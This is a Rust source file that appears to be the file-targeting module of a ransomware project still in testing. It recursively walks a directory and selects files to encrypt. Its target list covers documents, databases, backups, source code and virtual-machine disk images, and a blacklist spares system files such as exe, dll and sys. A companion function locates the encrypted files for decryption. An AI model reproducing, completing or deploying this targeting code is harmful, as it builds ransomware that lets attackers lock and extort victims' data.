use std::collections::HashSet;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use walkdir::WalkDir;
use crate::utils::logger::Logger;

/// Discovers files to be encrypted, FIX
pub fn discover_files(logger: &Logger, target_path: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    logger.log("Discovering files...");

    // Path to begin discovering files
    let path: &Path = Path::new(target_path);
    logger.log(&format!("Searching in path: {}", path.display()));

    // Recursively search for files in path and add to list
    let mut target_files: Vec<String> = Vec::new();
    let mut skipped_files: Vec<String> = Vec::new();
    let mut other_files: Vec<String> = Vec::new();

    for entry in WalkDir::new(path) {
        match entry {
            Ok(entry) => {
                let p = entry.path();

                // Check if path is a directory
                if let Ok(metadata) = fs::metadata(p) {
                    if metadata.is_dir() {
                        continue;
                    }
                }

                // Check for target file extensions
                if let Some(check) = check_file_extension(p) {
                    match check {
                        (true, _) => target_files.push(p.display().to_string()), // Push valid files
                        (false, ext) => skipped_files.push(ext), // Push skipped files
                    }
                } else {
                    other_files.push(p.display().to_string()); // Push files with no extensions
                }
            }
            Err(e) => eprintln!("Error reading entry: {}", e), // Handle WalkDir errors
        }
    }
    
    logger.log(&format!("Targeting complete. Target files:: {}", target_files.len()));

    // Write contents of files vector to new file -> REMOVE AFTER TESTING
    let _ = write_files_out(&target_files, "files/target_files.txt");
    // write skipped extensions to new file
    let _ = write_files_out(
        &remove_duplicates_unordered(skipped_files),
        "files/skipped_extentions.txt",
    );
    // write files with no extensions to new file
    let _ = write_files_out(&other_files, "files/other_files.txt");

    Ok(target_files)
}

/// Checks a given file path for a specific file extension, TEST
fn check_file_extension(path: &Path) -> Option<(bool, String)> {
    let _extensions = vec![
        "txt", "pdf", "mp3", "mp4", "jpg", "jpeg", "png", "gif", "bmp", "tiff", "webp", "xlsx",
        "docx", "pptx", "doc", "xls", "ppt", "csv", "json", "iso", "rtf", "odt", "ods", "odp",
        "log", "md", "xml", "yaml", "toml", "ini", "sql", "db", "sqlite", "bak", "backup",
        "tmp", "sav", "c", "cpp", "h", "cs", "py", "java", "rb", "go", "php", "js", "html", "css",
        "vmdk", "vhd", "ova", "qcow2", "vdi",
    ];

    let _blacklist = vec![
        "exe", "dll", "sys", "bat", "cmd", "vbs", "lnk", "ini", "inf",
    ];

    let test_ext = vec!["txt"];

    if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
        if test_ext.contains(&ext) {
            Some((true, ext.to_string())) // valid extension
        } else {
            Some((false, ext.to_string())) // invalid extension
        }
    } else {
        None // No extension case
    }
}

// Write discovered file paths to text file
fn write_files_out(list: &Vec<String>, path: &str) -> Result<(), std::io::Error> {
    let mut file = File::create(path)?;
    for f in list {
        file.write_all(f.as_bytes())?;
        file.write_all(b"\n")?; // Add a newline
    }
    Ok(())
}

/// Remove duplicates from vector
fn remove_duplicates_unordered<T: Eq + std::hash::Hash + Clone>(vec: Vec<T>) -> Vec<T> {
    let mut seen = HashSet::new();
    vec.into_iter()
        .filter(|item| seen.insert(item.clone())) // Insert item and check if it was already present
        .collect() // Collect the unique items into a vector
}

/// Discovers files to be decrypted, FIX
pub fn discover_files_decrypt(logger: &Logger, target_path: &str, extension: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    logger.log("Discovering encrypted files...");

    // let path: &Path = Path::new("/Users/wolf/dev/ransom_testing"); // FIX hardcoded path
    let path: &Path = Path::new(target_path);
    logger.log(&format!("Searching in path: {}", path.display()));

    let mut encrypted_files = Vec::new();
    // let encrypted_file_extension = "enc"; // FIX hardcoded extension

    for entry in WalkDir::new(path) {
        match entry {
            Ok(entry) => {
                let p = entry.path();

                // Check if path is a directory
                if let Ok(metadata) = fs::metadata(p) {
                    if metadata.is_dir() {
                        continue;
                    }
                }

                // Check for target file extensions
                let ext = p.extension().unwrap_or_default();
                if ext == extension {
                    encrypted_files.push(p.to_string_lossy().into_owned());
                }
                
            }
            Err(e) => eprintln!("Error reading entry: {}", e), // Handle WalkDir errors
        }
    }

    // Write contents of files vector to new file
    let _ = write_files_out(&encrypted_files, "files/decrypt_target_files.txt"); 
    logger.log(&format!("Targeting complete. Target files: {}", encrypted_files.len()));


    Ok(encrypted_files)
}

